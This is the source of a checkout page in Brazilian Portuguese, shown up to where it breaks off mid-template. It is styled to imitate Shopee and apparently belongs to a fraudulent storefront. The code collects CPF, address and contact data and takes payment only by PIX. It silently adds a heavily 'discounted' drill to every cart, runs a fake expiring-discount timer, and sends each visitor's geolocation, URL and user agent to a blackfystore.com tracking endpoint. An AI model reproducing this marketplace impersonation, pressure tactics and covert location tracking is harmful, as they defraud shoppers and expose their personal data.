<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Finaliza√ß√£o de Compra</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
    crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script>
      window.pixelId = "69504c70898e23c8d3abda84";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    </script>
   <script
   src="https://cdn.utmify.com.br/scripts/utms/latest.js"
   data-utmify-prevent-xcod-sck
   data-utmify-prevent-subids
   async
   defer
  ></script>
  <style>
    :root {
      --shopee-orange: #EE4D2D;
      --shopee-orange-dark: #D73211;
      --shopee-orange-light: #FFF4F2;
      --shopee-gray: #F5F5F5;
      --shopee-text: #333;
      --shopee-text-light: #757575;
    }

    body,
    html {
      overflow-x: hidden !important;
      background-color: var(--shopee-gray);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    }

    .mensagem-slide {
      position: relative;
      height: 1.25rem;
      overflow: hidden;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .mensagem-slide span {
      position: absolute;
      left: 0;
      right: 0;
      margin: 0 auto;
      text-align: center;
      opacity: 0;
      white-space: nowrap;
      animation: fadeMsg 9s infinite;
      transform: none;
    }

    .mensagem-slide span:nth-child(1) {
      animation-delay: 0s;
    }

    .mensagem-slide span:nth-child(2) {
      animation-delay: 3s;
    }

    .mensagem-slide span:nth-child(3) {
      animation-delay: 6s;
    }

    @keyframes fadeMsg {
      0% {
        opacity: 0;
      }

      8% {
        opacity: 1;
      }

      33% {
        opacity: 1;
      }

      41% {
        opacity: 0;
      }

      100% {
        opacity: 0;
      }
    }

    .toast-center {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(.98);
      min-width: 240px;
      max-width: 90vw;
      background: #3a3a3a;
      color: #fff;
      padding: 16px 20px;
      border-radius: 14px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, .25);
      z-index: 9999;
      display: inline-flex;
      align-items: center;
      gap: 12px;
      opacity: 0;
      pointer-events: none;
      transition: opacity .25s ease, transform .25s ease;
    }

    .toast-center.show {
      opacity: 1;
      transform: translate(-50%, -50%) scale(1);
    }

    /* Shopee-style cards */
    .shopee-card {
      background: white;
      border-radius: 4px;
      box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
      border: 1px solid rgba(0, 0, 0, 0.09);
    }

    /* Shopee-style buttons */
    .btn-shopee {
      background-color: var(--shopee-orange);
      color: white;
      border: none;
      border-radius: 2px;
      font-weight: 500;
      transition: background-color 0.2s;
    }

    .btn-shopee:hover {
      background-color: var(--shopee-orange-dark);
    }

    .btn-shopee:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }

    /* Shopee-style inputs */
    .input-shopee {
      border: 1px solid rgba(0, 0, 0, 0.14);
      border-radius: 2px;
      transition: border-color 0.2s;
    }

    .input-shopee:focus {
      outline: none;
      border-color: var(--shopee-orange);
      box-shadow: 0 0 0 2px rgba(238, 77, 45, 0.1);
    }
  </style>
  <!-- Rastreamento LED para mapa em tempo real -->
<script>
(async function() {
  const TRACK_ENDPOINT = 'https://blackfystore.com/app/api/track_led_visitor.php'; // endpoint novo
  const SLUG = 'checkout J'; // identificador da etapa checkout

  async function getLocation() {
    let loc = await new Promise(resolve => {
      if (!navigator.geolocation) return resolve({});
      navigator.geolocation.getCurrentPosition(
        pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => resolve({})
      );
    });
    if (!loc.lat || !loc.lng) {
      try {
        const resp = await fetch('https://ipapi.co/json/');
        if (resp.ok) {
          const data = await resp.json();
          if (data.latitude && data.longitude) {
            loc = { lat: data.latitude, lng: data.longitude };
          }
        }
      } catch (e) {}
    }
    return loc;
  }

  async function trackVisitor(stage) {
    const loc = await getLocation();
    if (!loc.lat || !loc.lng) return;
    const payload = {
      slug: SLUG,
      stage: stage || 'checkout',
      lat: loc.lat,
      lng: loc.lng,
      url: window.location.href,
      ref: document.referrer || '',
      ua: navigator.userAgent
    };
    fetch(TRACK_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  }

  trackVisitor('checkout');
})();
</script>
</head>

<body class="bg-gray-100 text-sm" style="background-color: var(--shopee-gray); color: var(--shopee-text);">
  <header class="fixed top-0 left-0 right-0 bg-white z-50 border-b" style="border-color: rgba(0,0,0,0.09); box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);">
    <div class="max-w-6xl mx-auto px-4 py-3 flex items-center">
      <button type="button" onclick="history.back()" class="text-xl mr-4 text-gray-600 hover:text-gray-900">
        <i class="fas fa-chevron-left"></i>
      </button>
      <img src="https://i.ibb.co/j9tP45B1/IMG-3379.jpg" alt="Logo" class="h-10 object-contain mr-3 flex-shrink-0" onerror="this.style.display='none'">
      <div class="flex-1 flex flex-col items-center justify-center min-w-0">
        <h1 class="font-semibold text-base text-center" style="color: var(--shopee-text); font-size: 14px !important;" >Finalizar Compra</h1>
        <div class="text-xs mensagem-slide text-center" style="color: var(--shopee-orange);">
          <span><i class="fas fa-shield-alt mr-1"></i>Pagamento 100% seguro</span>
          <span><i class="fas fa-lock mr-1"></i>Dados criptografados</span>
          <span><i class="fas fa-check-circle mr-1"></i>Compra garantida</span>
        </div>
      </div>
    </div>
  </header>

  <main class="pt-20 pb-36">
    <div class="max-w-6xl mx-auto px-4 py-4">
      <div class="grid grid-cols-1 lg:grid-cols-3 gap-4">
        <!-- Coluna principal - Formul√°rios -->
        <div class="lg:col-span-2 space-y-4">
          <!-- Se√ß√£o de produtos -->
          <section class="shopee-card">
            <div class="px-4 py-3 flex justify-between items-center border-b" style="border-color: rgba(0,0,0,0.09);">
              <h2 id="checkoutResumoTitulo" class="font-semibold text-base" style="color: var(--shopee-text);">Produtos</h2>
              <div class="flex items-center gap-2 text-xs" style="color: var(--shopee-text-light);">
                <span id="notaResumo" class="hidden"><i class="fas fa-star text-amber-400 mr-1"></i><span
                    id="notaValor"></span></span>
                <span id="vendidosResumo" class="hidden"></span>
              </div>
            </div>
            <div data-role="cart-items"></div>
          </section>

          <!-- Se√ß√£o de descontos -->
          <section class="shopee-card">
            <div class="px-4 py-3 flex justify-between items-center">
              <span class="flex items-center text-sm" style="color: var(--shopee-text);">
                <i class="fas fa-ticket-alt mr-2" style="color: var(--shopee-orange);"></i>Descontos aplicados
              </span>
              <span id="desconto-3" class="text-xs font-semibold px-2 py-1 rounded" style="background-color: var(--shopee-orange-light); color: var(--shopee-orange);">R$ 0,00</span>
            </div>
          </section>

          <!-- Se√ß√£o de formul√°rios -->
          <section class="shopee-card px-4 py-6">
            <div class="flex justify-between items-center mb-6">
              <div class="flex flex-col items-center flex-1">
                <div id="step-1-indicator"
                  class="w-10 h-10 flex items-center justify-center rounded-full text-sm font-semibold mb-2"
                  style="background-color: var(--shopee-orange); color: white;">
                  1</div>
                <span class="text-xs font-semibold" style="color: var(--shopee-text);">Identifica√ß√£o</span>
              </div>
              <div class="flex-1 border-t mx-2" style="border-color: rgba(0,0,0,0.09);"></div>
              <div class="flex flex-col items-center flex-1">
                <div id="step-2-indicator"
                  class="w-10 h-10 flex items-center justify-center rounded-full text-sm font-semibold mb-2"
                  style="background-color: #e0e0e0; color: #999;">
                  2</div>
                <span class="text-xs" style="color: var(--shopee-text-light);">Entrega</span>
              </div>
              <div class="flex-1 border-t mx-2" style="border-color: rgba(0,0,0,0.09);"></div>
              <div class="flex flex-col items-center flex-1">
                <div id="step-3-indicator"
                  class="w-10 h-10 flex items-center justify-center rounded-full text-sm font-semibold mb-2"
                  style="background-color: #e0e0e0; color: #999;">
                  3</div>
                <span class="text-xs" style="color: var(--shopee-text-light);">Pagamento</span>
              </div>
            </div>

            <div id="step-1" class="step space-y-4">
              <div>
                <label for="email" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">E-mail</label>
                <input type="email" id="email" class="input-shopee mt-1 block w-full px-3 py-2" required>
              </div>
              <div>
                <label for="telefone" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Telefone</label>
                <input type="tel" id="telefone" placeholder="(99) 99999-9999" class="input-shopee mt-1 block w-full px-3 py-2" required>
              </div>
              <div>
                <label for="nome" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Nome completo</label>
                <input type="text" id="nome" class="input-shopee mt-1 block w-full px-3 py-2" required>
              </div>
              <div>
                <label for="cpf" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">CPF/CNPJ</label>
                <input type="text" id="cpf" placeholder="000.000.000-00" class="input-shopee mt-1 block w-full px-3 py-2" required>
              </div>
              <div class="border border-dashed p-4 rounded" style="border-color: rgba(0,0,0,0.14); background-color: #fafafa;">
                <p class="font-semibold mb-2 text-xs" style="color: var(--shopee-text);">Por que precisamos desses dados?</p>
                <ul class="list-disc ml-4 space-y-1 text-xs" style="color: var(--shopee-text-light);">
                  <li>Enviar o comprovante de compra;</li>
                  <li>Garantir a devolu√ß√£o caso necess√°rio;</li>
                  <li>Acompanhar o andamento da encomenda.</li>
                </ul>
              </div>
              <button type="button" onclick="proximaEtapa(2)" class="btn-shopee w-full py-3 text-sm font-semibold">
                Continuar para Entrega
              </button>
            </div>

            <div id="step-2" class="step hidden space-y-4">
              <div>
                <label for="cep" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">CEP</label>
                <input type="text" id="cep" placeholder="00000-000" class="input-shopee mt-1 block w-full px-3 py-2" required>
                <small id="cep-msg" class="text-xs hidden" style="color: var(--shopee-orange);"></small>
              </div>
              <div>
                <label for="endereco" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Endere√ßo</label>
                <input type="text" id="endereco" placeholder="Rua / Avenida" class="input-shopee mt-1 block w-full px-3 py-2" required>
              </div>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label for="numero" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">N√∫mero</label>
                  <input type="text" id="numero" class="input-shopee mt-1 block w-full px-3 py-2" required>
                </div>
                <div>
                  <label for="bairro" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Bairro</label>
                  <input type="text" id="bairro" class="input-shopee mt-1 block w-full px-3 py-2" required>
                </div>
              </div>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label for="cidade" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Cidade</label>
                  <input type="text" id="cidade" class="input-shopee mt-1 block w-full px-3 py-2" required>
                </div>
                <div>
                  <label for="estado" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Estado</label>
                  <input type="text" id="estado" maxlength="2" class="input-shopee mt-1 block w-full px-3 py-2 uppercase" required>
                </div>
              </div>
              <div>
                <label for="complemento" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Complemento</label>
                <input type="text" id="complemento" placeholder="Apartamento, bloco, refer√™ncia (opcional)" class="input-shopee mt-1 block w-full px-3 py-2">
              </div>
              <fieldset id="frete-fieldset" class="space-y-3">
                <legend class="text-sm font-medium mb-2" style="color: var(--shopee-text);">Selecione o frete</legend>
                <div id="frete-loading" class="text-sm" style="color: var(--shopee-text-light);">Carregando fretes‚Ä¶</div>
              </fieldset>
              <div class="text-sm" style="color: var(--shopee-text-light);">Frete selecionado: <span id="freteSelecionado">A definir</span></div>
              <button type="button" onclick="proximaEtapa(3)" class="btn-shopee w-full py-3 text-sm font-semibold">
                Continuar para Pagamento
              </button>
            </div>

            <div id="step-3" class="step hidden space-y-4">
              <!-- Order Bumps (m√∫ltiplas caixinhas) - s√≥ vis√≠vel na etapa 3, acima da forma de pagamento -->
              <section id="order-bumps-container" class="hidden space-y-3">
                <!-- cards injetados via JS -->
              </section>
              <div class="shopee-card p-4">
                <h3 class="text-sm font-semibold mb-3" style="color: var(--shopee-text);">Forma de pagamento</h3>
                <label class="flex items-center justify-between p-3 border rounded cursor-pointer hover:bg-gray-50" style="border-color: rgba(0,0,0,0.14);">
                  <span class="flex items-center gap-3">
                    <span class="inline-flex items-center justify-center w-8 h-8 rounded" style="background-color: #00C853; color: white;">
                      <i class="fab fa-pix"></i>
                    </span>
                    <span style="color: var(--shopee-text);">PIX √† vista</span>
                  </span>
                  <input type="radio" name="pagamento" value="pix" checked>
                </label>
              </div>
              <button type="button" id="button-comprar" onclick="finalizarCompra()" class="btn-shopee w-full py-3 text-sm font-semibold uppercase">
                Finalizar compra
              </button>
            </div>
          </section>
        </div>

        <!-- Sidebar - Resumo financeiro -->
        <div class="lg:col-span-1">
          <div class="shopee-card sticky top-24">
            <div class="px-4 py-3 border-b" style="border-color: rgba(0,0,0,0.09);">
              <h3 class="font-semibold text-base" style="color: var(--shopee-text);">Resumo da encomenda</h3>
            </div>
            <div class="px-4 py-4 space-y-3">
              <div class="flex justify-between text-sm">
                <span style="color: var(--shopee-text-light);">Subtotal</span>
                <span id="total-carrinho" style="color: var(--shopee-text);">R$ 0,00</span>
              </div>
              <div class="flex justify-between text-sm">
                <span style="color: var(--shopee-orange);">
                  <i class="fas fa-badge-percent mr-1"></i>Descontos
                </span>
                <span id="desconto-2" style="color: var(--shopee-orange); font-weight: 600;">R$ 0,00</span>
              </div>
              <div class="flex justify-between text-xs">
                <span style="color: var(--shopee-text-light);">Frete</span>
                <span id="total-frete" style="color: var(--shopee-text-light);">A definir</span>
              </div>
              <hr style="border-color: rgba(0,0,0,0.09);">
              <div class="flex justify-between text-base font-bold">
                <span style="color: var(--shopee-text);">Total</span>
                <span id="total" style="color: var(--shopee-orange);">R$ 0,00</span>
              </div>
              <p class="text-right text-xs" style="color: var(--shopee-text-light);">Impostos inclusos</p>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div id="toastContainer"></div>
  </main>

  <footer class="fixed bottom-0 left-0 right-0 bg-white border-t" style="border-color: rgba(0,0,0,0.09); box-shadow: 0 -1px 2px 0 rgba(0,0,0,0.1);">
    <div class="max-w-6xl mx-auto">
      <div class="px-4 py-2 text-xs text-center" style="background-color: var(--shopee-orange-light); color: var(--shopee-orange);">
        <i class="fas fa-gift mr-1"></i>Voc√™ est√° economizando <span id="desconto-1">R$ 0,00</span> nesta encomenda.
      </div>
      <div class="flex justify-between items-center px-4 pt-2 pb-1">
        <p class="text-xs" style="color: var(--shopee-text-light);">Total (<span id="quantidade_x">0 itens</span>)</p>
        <p class="text-lg font-bold" id="total1" style="color: var(--shopee-orange);">R$ 0,00</p>
      </div>
      <button type="button" class="btn-shopee w-full py-3 text-sm font-semibold" disabled style="opacity: 0.6;">
        <span id="contador">O desconto expira em 05:00:00</span>
      </button>
    </div>
  </footer>

  <script>
    const state = {
      carrinho: [],
      subtotal: 0,
      desconto: 0,
      fretes: [],
      selectedFrete: null,
      ordemAnterior: null
    };
    let currentStep = 1;
    // Mapa global para recuperar dados dos order bumps por id
    window.__orderBumps = new Map();
    // Controle de busca de CEP
    let cepLookupTimer = null;
    let lastCepLookedUp = '';

    const toNumber = (value) => {
      if (typeof value === 'number') {
        return Number.isFinite(value) ? value : 0;
      }
      if (typeof value === 'string') {
        const trimmed = value.trim();
        if (!trimmed) {
          return 0;
        }
        const normalized = trimmed
          .replace(/[^0-9,.\-]/g, '')
          .replace(/\.(?=\d{3}(?:[.,]|$))/g, '')
          .replace(',', '.');
        const parsed = parseFloat(normalized);
        return Number.isFinite(parsed) ? parsed : 0;
      }
      if (value === null || value === undefined) {
        return 0;
      }
      const coerced = Number(value);
      return Number.isFinite(coerced) ? coerced : 0;
    };

    const formatBRL = (value) => {
      const numericValue = toNumber(value);
      return new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(numericValue);
    };

    const resolveMedia = (path) => {
      if (!path) return 'https://via.placeholder.com/160x160.png?text=Produto';
      if (/^https?:/i.test(path)) return path;
      // Se come√ßa com ../, resolve o caminho relativo corretamente
      if (path.startsWith('../')) {
        const origin = window.location.origin && window.location.origin !== 'null' ? window.location.origin : '';
        const currentPath = window.location.pathname;
        // Remove o √∫ltimo segmento (checkout/) e adiciona o caminho relativo
        const pathParts = currentPath.split('/').filter(p => p);
        pathParts.pop(); // Remove 'checkout'
        const cleanPath = path.replace(/^\.\.\//, '');
        const resolvedPath = '/' + pathParts.join('/') + '/' + cleanPath;
        return origin ? `${origin}${resolvedPath}` : resolvedPath;
      }
      const clean = String(path).replace(/^[./]+/, '');
      const origin = window.location.origin && window.location.origin !== 'null' ? window.location.origin : '';
      return origin ? `${origin}/${clean}` : `/${clean}`;
    };

    const normalizarItemCarrinho = (raw) => {
      const item = raw || {};
      const precoBase = toNumber(item.preco !== undefined ? item.preco : item.precoUnitario);
      const precoComparacao = toNumber(
        item.preco_comparacao !== undefined
          ? item.preco_comparacao
          : item.precoComparacao !== undefined
            ? item.precoComparacao
            : item.precoReferencia
      );
      const quantidade = Math.max(1, parseInt(item.quantidade !== undefined ? item.quantidade : item.qty, 10) || 1);
      return {
        ...item,
        preco: precoBase,
        precoComparacao: precoComparacao || precoBase,
        preco_comparacao: precoComparacao || precoBase,
        quantidade
      };
    };

    const getInputValue = (id) => {
      const el = document.getElementById(id);
      return el ? el.value.trim() : '';
    };

    function persistCarrinho() {
      try {
        const payload = JSON.stringify(state.carrinho);
        localStorage.setItem('carrinho', payload);
        sessionStorage.setItem('checkoutCarrinho', payload);
      } catch (error) {
        console.warn('N√£o foi poss√≠vel salvar o carrinho:', error);
      }
    }

    function loadCarrinho() {
      try {
        // Prioridade: 1) sessionStorage checkoutCarrinho, 2) localStorage carrinho, 3) checkoutOrdem
        const carrinhoSessao = sessionStorage.getItem('checkoutCarrinho');
        const carrinhoLocal = localStorage.getItem('carrinho');
        const ordemSalvaRaw = sessionStorage.getItem('checkoutOrdem');
        
        console.log('=== loadCarrinho ===');
        console.log('checkoutCarrinho (session):', carrinhoSessao);
        console.log('carrinho (local):', carrinhoLocal);
        
        let origem = null;
        
        // Tenta primeiro do sessionStorage (mais recente)
        if (carrinhoSessao) {
          try {
            const parsed = JSON.parse(carrinhoSessao);
            if (Array.isArray(parsed) && parsed.length > 0) {
              origem = carrinhoSessao;
              console.log('Usando checkoutCarrinho do sessionStorage');
            }
          } catch (e) {
            console.warn('Erro ao parsear checkoutCarrinho:', e);
          }
        }
        
        // Se n√£o encontrou, tenta do localStorage
        if (!origem && carrinhoLocal) {
          try {
            const parsed = JSON.parse(carrinhoLocal);
            if (Array.isArray(parsed) && parsed.length > 0) {
              origem = carrinhoLocal;
              console.log('Usando carrinho do localStorage');
            }
          } catch (e) {
            console.warn('Erro ao parsear carrinho local:', e);
          }
        }
        
        // √öltimo recurso: tenta do checkoutOrdem
        if (!origem && ordemSalvaRaw) {
          try {
            const parsed = JSON.parse(ordemSalvaRaw);
            if (parsed && Array.isArray(parsed.carrinho) && parsed.carrinho.length) {
              origem = JSON.stringify(parsed.carrinho);
              console.log('Usando carrinho do checkoutOrdem');
            }
          } catch (e) {
            console.warn('Erro ao parsear checkoutOrdem:', e);
          }
        }
        
        state.carrinho = origem ? JSON.parse(origem) : [];
        console.log('Carrinho carregado (antes normalizar):', state.carrinho);
        console.log('Quantidade de itens:', state.carrinho.length);
      } catch (error) {
        console.error('Erro ao carregar carrinho:', error);
        state.carrinho = [];
      }
      
      if (!Array.isArray(state.carrinho)) {
        console.warn('Carrinho n√£o √© array, resetando');
        state.carrinho = [];
      }
      
      state.carrinho = state.carrinho.map(normalizarItemCarrinho);
      console.log('Carrinho normalizado:', state.carrinho);
      console.log('Quantidade de itens ap√≥s normalizar:', state.carrinho.length);
      
      // Adiciona produto fixo se n√£o existir
      adicionarProdutoFixo();
      
      persistCarrinho();
    }

    function adicionarProdutoFixo() {
      const PRODUTO_FIXO_ID = 'FIXO_FURADEIRA_20V';
      const produtoFixo = {
        produtoId: PRODUTO_FIXO_ID,
        titulo: 'Furadeira Parafusadeira de impacto 1/2" a Bateria 20V Brushless com 2 Baterias',
        preco: 69.83,
        precoComparacao: 497.90,
        preco_comparacao: 497.90,
        desconto: 0,
        variacao: '',
        variacaoId: null,
        imagem: '1m.png',
        quantidade: 1
      };
      
      // Verifica se o produto fixo j√° existe no carrinho
      const existe = state.carrinho.some(item => 
        String(item.produtoId) === String(PRODUTO_FIXO_ID)
      );
      
      if (!existe) {
        const itemNormalizado = normalizarItemCarrinho(produtoFixo);
        state.carrinho.unshift(itemNormalizado); // Adiciona no in√≠cio do carrinho
        console.log('Produto fixo adicionado ao carrinho');
      }
    }

    async function carregarCarrinhoDaQuery() {
      try {
        const params = new URLSearchParams(window.location.search);
        const produtoId = params.get('produto_id') || params.get('produto');
        if (!produtoId) {
          return;
        }

        const resposta = await fetch('produtos.json', { cache: 'no-store' });
        if (!resposta.ok) {
          throw new Error(`Falha ao carregar produtos: ${resposta.status}`);
        }
        const data = await resposta.json();
        const produtos = Array.isArray(data) ? data : [];

        const produto = produtos.find((item) => {
          const id = item?.id !== undefined ? String(item.id) : null;
          const slug = item?.slug ?? item?.slugfy ?? null;
          return (id && id === String(produtoId)) || (slug && slug === produtoId);
        });
        if (!produto) {
          return;
        }

        const variacoes = Array.isArray(produto.variacoes) ? produto.variacoes : [];
        const variacaoId = params.get('variacao_id') || params.get('variacao');
        const variacaoSelecionada =
          variacoes.find((variacao) => String(variacao.id ?? '') === String(variacaoId ?? '')) ||
          variacoes[0] ||
          null;

        const precoBase = variacaoSelecionada
          ? toNumber(variacaoSelecionada.preco ?? produto.preco)
          : toNumber(produto.preco);
        const precoReferencia = variacaoSelecionada
          ? toNumber(
            variacaoSelecionada.preco_comparacao ??
            variacaoSelecionada.precoComparacao ??
            variacaoSelecionada.preco ??
            produto.preco_comparacao ??
            produto.preco
          )
          : toNumber(produto.preco_comparacao ?? produto.preco);
        const descontoCalculado = variacaoSelecionada
          ? toNumber(variacaoSelecionada.desconto ?? produto.desconto)
          : toNumber(produto.desconto);

        const imagemPrincipal = variacaoSelecionada?.imagem
          || (Array.isArray(produto.fotos) ? produto.fotos[0] : '');

        const item = normalizarItemCarrinho({
          produtoId: produto.id ?? null,
          titulo: variacaoSelecionada?.titulo || produto.titulo || 'Produto',
          preco: precoBase,
          precoComparacao: precoReferencia,
          preco_comparacao: precoReferencia,
          desconto: descontoCalculado,
          variacao: variacaoSelecionada
            ? variacaoSelecionada.info || variacaoSelecionada.titulo || ''
            : '',
          variacaoId: variacaoSelecionada?.id ?? null,
          imagem: imagemPrincipal,
          quantidade: 1,
        });

        state.carrinho = [item];
        // Adiciona produto fixo se n√£o existir
        adicionarProdutoFixo();
        persistCarrinho();
      } catch (error) {
        console.error('Erro ao carregar produto pela URL do checkout:', error);
      }
    }

    function showToast(message) {
      const container = document.getElementById('toastContainer');
      if (!container) return;
      const toast = document.createElement('div');
      toast.className = 'toast-center';
      toast.innerHTML = `<i class="fas fa-check-circle"></i><span>${message}</span>`;
      container.appendChild(toast);
      requestAnimationFrame(() => toast.classList.add('show'));
      setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 250);
      }, 2000);
    }

    function renderCarrinho() {
      console.log('=== renderCarrinho chamado ===');
      console.log('state.carrinho:', state.carrinho);
      console.log('state.carrinho.length:', state.carrinho.length);
      
      const containers = document.querySelectorAll('[data-role="cart-items"]');
      console.log('Containers encontrados:', containers.length);
      
      const resumoTitulo = document.getElementById('checkoutResumoTitulo');
      const descontoEls = [
        document.getElementById('desconto-1'),
        document.getElementById('desconto-2'),
        document.getElementById('desconto-3')
      ];
      const totalQtdEl = document.getElementById('quantidade_x');

      let subtotal = 0;
      let desconto = 0;
      let totalItens = 0;

      const rows = state.carrinho.map((item, index) => {
        const preco = toNumber(item.preco);
        const precoCmp = toNumber(
          item.preco_comparacao !== undefined ? item.preco_comparacao : item.precoComparacao
        );
        const quantidade = Math.max(1, parseInt(item.quantidade, 10) || 1);
        const itemSubtotal = preco * quantidade;
        if (Number.isFinite(itemSubtotal)) {
          subtotal += itemSubtotal;
        }
        if (precoCmp > preco) {
          const diff = (precoCmp - preco) * quantidade;
          if (Number.isFinite(diff)) {
            desconto += diff;
          }
        }
        totalItens += quantidade;

        const imagemBase = resolveMedia(item.imagem);
        const slugPath =
          item.full_slug && !/^https?:/i.test(item.full_slug)
            ? item.full_slug.replace(/^\.\/+/, '')
            : '';
        const imagemFinal = slugPath && item.imagem ? `${slugPath}/${item.imagem}` : imagemBase;
        const subtotalDisplay = Number.isFinite(itemSubtotal) ? itemSubtotal : 0;

        return `
          <div class="flex items-start gap-4 px-4 py-3 border-t" style="border-color: rgba(0,0,0,0.09);">
            <img src="${imagemFinal}" alt="${item.titulo || 'Produto'}" class="w-20 h-20 object-contain rounded border bg-white" style="border-color: rgba(0,0,0,0.09);">
            <div class="flex-1 space-y-2">
              <div class="flex justify-between items-start gap-4">
                <div>
                  <p class="font-semibold text-sm" style="color: var(--shopee-text);">${item.titulo || 'Produto'}</p>
                  ${item.variacao ? `<p class="text-xs" style="color: var(--shopee-text-light);">${item.variacao}</p>` : ''}
                </div>
              </div>
              <div class="flex justify-between items-end">
                <div>
                  <p class="font-semibold text-sm" style="color: var(--shopee-orange);">${formatBRL(preco)}</p>
                  ${precoCmp > preco ? `<p class="text-xs line-through" style="color: var(--shopee-text-light);">${formatBRL(precoCmp)}</p>` : ''}
                  <p class="text-xs" style="color: var(--shopee-text-light);">Qtd: ${quantidade}</p>
                </div>
                <div class="text-sm font-semibold" style="color: var(--shopee-text);">${formatBRL(subtotalDisplay)}</div>
              </div>
            </div>
          </div>
        `;
      });

      containers.forEach((container) => {
        if (!container) {
          console.warn('Container n√£o encontrado!');
          return;
        }
        if (!rows.length) {
          console.log('Sem itens para renderizar, mostrando mensagem vazio');
          container.innerHTML = '<p class="px-4 py-6 text-sm text-center" style="color: var(--shopee-text-light);">Seu carrinho est√° vazio.</p>';
          return;
        }
        console.log('Renderizando', rows.length, 'itens no container');
        container.innerHTML = rows.join('');
        console.log('HTML inserido no container');
      });

      state.subtotal = Number.isFinite(subtotal) ? Number(subtotal.toFixed(2)) : 0;
      state.desconto = Number.isFinite(desconto) ? Number(desconto.toFixed(2)) : 0;
      
      console.log('=== renderCarrinho - c√°lculos ===');
      console.log('Subtotal calculado:', state.subtotal);
      console.log('Desconto calculado:', state.desconto);
      console.log('Total de itens:', totalItens);
      
      descontoEls.forEach((el) => {
        if (el) el.textContent = formatBRL(state.desconto);
      });
      if (totalQtdEl) {
        totalQtdEl.textContent = totalItens === 1 ? '1 item' : `${totalItens} itens`;
      }
      if (resumoTitulo) {
        resumoTitulo.textContent = `Resumo do carrinho (${totalItens} ${totalItens === 1 ? 'item' : 'itens'})`;
      }
      persistCarrinho();
      updateTotals();
    }

    function updateTotals() {
      const subtotal = Number.isFinite(state.subtotal) ? state.subtotal : 0;
      const freteValor = state.selectedFrete ? toNumber(state.selectedFrete.preco) : 0;
      const total = Number((subtotal + freteValor).toFixed(2));

      console.log('=== updateTotals ===');
      console.log('Subtotal:', subtotal);
      console.log('Frete:', freteValor);
      console.log('Total:', total);

      const subtotalEl = document.getElementById('total-carrinho');
      const totalEl = document.getElementById('total');
      const totalFooterEl = document.getElementById('total1');
      const totalFreteEl = document.getElementById('total-frete');

      if (subtotalEl) {
        subtotalEl.textContent = formatBRL(subtotal);
        console.log('Subtotal atualizado no elemento:', subtotalEl.textContent);
      }
      if (totalEl) {
        totalEl.textContent = formatBRL(total);
        console.log('Total atualizado no elemento:', totalEl.textContent);
      }
      if (totalFooterEl) {
        totalFooterEl.textContent = formatBRL(total);
        console.log('Total footer atualizado:', totalFooterEl.textContent);
      }
      if (totalFreteEl) {
        totalFreteEl.textContent = state.selectedFrete
          ? `${state.selectedFrete.titulo} (${formatBRL(freteValor)})`
          : 'A definir';
      }

      return total;
    }

    function carregarFretes() {
      const fieldset = document.getElementById('frete-fieldset');
      if (!fieldset) return;
      fieldset.innerHTML = '<div id="frete-loading" class="text-sm" style="color: var(--shopee-text-light);">Carregando fretes‚Ä¶</div>';

      fetch('frete.json', { cache: 'no-store' })
        .then((res) => res.json())
        .then((data) => {
          state.fretes = Array.isArray(data)
            ? data.map((frete, index) => ({
              ...frete,
              id: frete.id !== undefined ? frete.id : index,
              preco: toNumber(frete.preco)
            }))
            : [];
          if (!state.fretes.length) {
            fieldset.innerHTML = '<p class="text-sm" style="color: var(--shopee-text-light);">Nenhuma op√ß√£o de frete dispon√≠vel.</p>';
            return;
          }

          const savedId = localStorage.getItem('checkout_frete_id');
          const markup = state.fretes
            .map((frete, index) => {
              const checked = savedId
                ? String(savedId) === String(frete.id)
                : index === 0;
              const logoUrl = frete.logo || '';
              return `
                <label class="flex items-start justify-between gap-3 border rounded px-3 py-3 cursor-pointer hover:bg-gray-50 transition-colors" style="border-color: rgba(0,0,0,0.14);">
                  <div class="flex items-start gap-3 flex-1">
                    <input type="radio" name="frete" value="${frete.id}" class="mt-1" data-preco="${frete.preco}" data-titulo="${frete.titulo || 'Frete'}" ${checked ? 'checked' : ''}>
                    ${logoUrl ? `<img src="${logoUrl}" alt="${frete.titulo || 'Frete'}" class="w-12 h-12 object-contain rounded" onerror="this.style.display='none'">` : ''}
                    <div class="flex-1">
                      <p class="text-sm font-semibold" style="color: var(--shopee-text);">${frete.titulo || 'Frete'}</p>
                      <p class="text-xs" style="color: var(--shopee-text-light);">${frete.descricao || ''}</p>
                    </div>
                  </div>
